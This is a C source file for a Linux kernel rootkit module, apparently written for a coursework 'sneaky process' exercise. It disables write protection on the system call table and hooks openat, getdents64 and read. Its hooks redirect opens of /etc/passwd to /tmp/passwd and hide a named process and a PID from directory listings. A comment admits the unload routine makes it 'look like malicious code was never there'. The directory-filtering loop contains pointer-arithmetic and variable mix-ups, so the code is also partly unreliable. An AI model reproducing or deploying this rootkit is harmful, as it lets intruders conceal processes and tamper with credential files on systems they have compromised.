#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

//This is a pointer to the system call table
static unsigned long *sys_call_table;

char * sneaky_pid = "";
module_param(sneaky_pid, charp, 0);

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) ptr, &level);
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

int disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) ptr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents)(struct pt_regs *);
asmlinkage ssize_t (*original_read)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
// int openat(int dirfd, const char *pathname, int flags);
// DI, SI, DX
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    // Implement the sneaky part here
    if (strnstr((char *)regs->si, "/etc/passwd", strlen("/etc/passwd")) != NULL) {
        copy_to_user((void *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
    }
    return (*original_openat)(regs);
}

// int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
// DI, SI, DX
asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
    struct linux_dirent64 *d;
    int nread = original_getdents(regs);
    struct linux_dirent64 * dirp = (struct linux_dirent64 *)regs->si;
    int bpos;

    if (nread == -1) {
        return -1;
    }
    if (nread == 0) {
        return 0;
    }

    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent64 *) (dirp + bpos);
        if (strcmp(dirp->d_name, "sneaky_process") == 0 || strcmp(dirp->d_name, sneaky_pid) == 0) {
            memmove((void *)(dirp + bpos), (void *)(dirp + bpos + d->d_reclen), nread - d->d_reclen - bpos);
            nread -= d->d_reclen;
            continue;
        }
        bpos += d->d_reclen;
    }
    return nread;
    //return (*original_getdents)(regs);
}

// ssize_t read(int fd, void *buf, size_t count);
// DI, SI, DX
asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
    /*
    ssize_t nread = original_read(regs->di, regs->si, regs->dx);
    if (nread == -1) {
        return -1;
    }
    if (nread == 0) {
        return 0;
    }
    char * find = strnstr(regs->si, "sneaky_process", strlen("sneaky_process"));
    if (find != NULL) {
        char * end = strnstr(find, "\n", strlen("\n"));
        if (end != NULL) {
            memmove(find, end + 1, nread - (end + 1 - find));
            nread -= (end + 1 - find);
        }
    }
    return nread;
     */
    return (*original_read)(regs);
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
    // See /var/log/syslog or use `dmesg` for kernel print output
    printk(KERN_INFO
    "Sneaky module being loaded.\n");

    // Lookup the address for this symbol. Returns 0 if not found.
    // This address will change after rebooting due to protection
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    // This is the magic! Save away the original 'openat' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.
    original_openat = (void *) sys_call_table[__NR_openat];

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *) sys_call_table);

    sys_call_table[__NR_openat] = (unsigned long) sneaky_sys_openat;

    // You need to replace other system calls you need to hack here
    original_getdents = (void *) sys_call_table[__NR_getdents64];
    original_read = (void *) sys_call_table[__NR_read];
    sys_call_table[__NR_getdents64] = (unsigned long) sneaky_sys_getdents;
    sys_call_table[__NR_read] = (unsigned long) sneaky_sys_read;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *) sys_call_table);

    return 0;       // to show a successful load
}


static void exit_sneaky_module(void) {
    printk(KERN_INFO
    "Sneaky module being unloaded.\n");

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *) sys_call_table);

    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    sys_call_table[__NR_openat] = (unsigned long) original_openat;
    sys_call_table[__NR_getdents64] = (unsigned long) original_getdents;
    sys_call_table[__NR_read] = (unsigned long) original_read;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *) sys_call_table);
}


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");